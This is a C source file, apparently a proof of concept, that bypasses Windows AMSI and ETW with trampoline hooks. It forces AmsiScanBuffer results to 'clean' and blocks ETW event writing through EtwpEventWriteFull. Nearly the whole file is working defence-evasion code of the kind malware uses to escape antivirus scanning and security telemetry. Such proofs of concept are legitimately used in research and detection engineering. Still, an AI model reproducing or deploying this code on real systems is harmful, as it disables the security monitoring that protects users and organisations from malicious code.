/*
	
	Author: MochaByte
	Date: 24.06.2025
	Description: PoC AMSI & ETW bypass through trampoline hooking
	
*/

#include <stdio.h>
#include <amsi.h>
#include <Windows.h>

#include "functions.h"

//#define DEBUG

// The proxy function
VOID ProxyAmsi(PCONTEXT pCtx)
{
	// Getting the AmsiScanBuffer result
	// The result is "stored" as the sixth argument of the AmsiScanBuffer function. Considering the x64 calling conention, this means that the argument is pushed on the stack.
	// pCtx->Rsp + (0x06 * sizeof(PVOID)) this gets us the full arg
	AMSI_RESULT* pRes = (AMSI_RESULT*)(*(ULONG_PTR*)(pCtx->Rsp + (0x06 * sizeof(PVOID))));
#ifdef DEBUG
	printf("[DBG] Original AmsiScanBuffer result: 0x%08\n", *pRes);
#endif
	// Changing the result
	*pRes = AMSI_RESULT_CLEAN;
	// Blocking normal execution flow
	BlockExecutionFlow(pCtx);
	// Continuing execution
	pCtx->EFlags = pCtx->EFlags | (1 << 16);

}


int main() 
{

	PVOID	pOriginalAmsiFunc	= NULL,
			pOriginalEtwFunc	= NULL,
			pEtwpEventWriteFull = NULL,
			pAmsiScanBuff		= NULL;

	DWORD	dwOldProtectAmsi	= 0,
			dwOldProtectEtw		= 0;

	// Loading amsi.dll
	LoadLibrary((TEXT("AMSI")));

#ifdef DEBUG
	printf("[DBG] Fetching EtwpEventWriteFull..\n");
#endif

	GetEtwpEventWriteFull(&pEtwpEventWriteFull);
	pAmsiScanBuff = GetProcAddress(GetModuleHandle(TEXT("Amsi.dll")), "AmsiScanBuffer");
	if (pAmsiScanBuff == NULL)
	{
		printf("[-] Failed to get AmsiScanBuffer: %d\n", GetLastError());
		return -1;
	}

	printf("[#] Press Enter to continue");
	getchar();

#ifdef DEBUG
	printf("[DBG] Setting up trampoline functions..\n");
#endif
	if (!TrampolineX64(pEtwpEventWriteFull, BlockExecutionFlow, &pOriginalEtwFunc, &dwOldProtectEtw))
		return -1;

	if (!TrampolineX64(pAmsiScanBuff, ProxyAmsi, &pOriginalAmsiFunc, &dwOldProtectAmsi))
		return -1;

#ifdef DEBUG
	printf("[DBG] dwOldProtectEtw value in main.c is: %d\n", dwOldProtectEtw);
	printf("[DBG] dwOldProtectAmsi value in main.c is: %d\n", dwOldProtectAmsi);
	printf("[DBG] EtwpEventWriteFull is now hooked\n");
	printf("[DBG] AmsiScanBuffer is now hooked\n");
#endif

	printf("[+] Successfully hooked ETW & AMSI\n");

	printf("[#] Press Enter to stop");
	getchar();

	return 0;
}